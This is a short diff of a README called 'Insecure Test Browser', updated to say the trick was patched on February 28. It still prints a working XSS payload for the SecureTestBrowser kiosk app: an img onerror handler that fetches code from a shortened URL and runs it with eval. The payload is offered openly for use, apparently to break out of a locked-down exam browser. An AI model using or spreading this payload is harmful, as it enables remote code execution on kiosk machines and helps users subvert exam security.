@@ -1,4 +1,6 @@
-# Insecure Test Browser
+# [PATCHED] Insecure Test Browser
+> This got patched February 28, and no alterative methods have been found so far.
+
 XSS in SecureTestBrowser kiosk app (good luck memorizing it)
 ```
 <img src=# onerror='fetch("https://tinyurl.com/securexss").then(r => r.text()).then(eval);'>
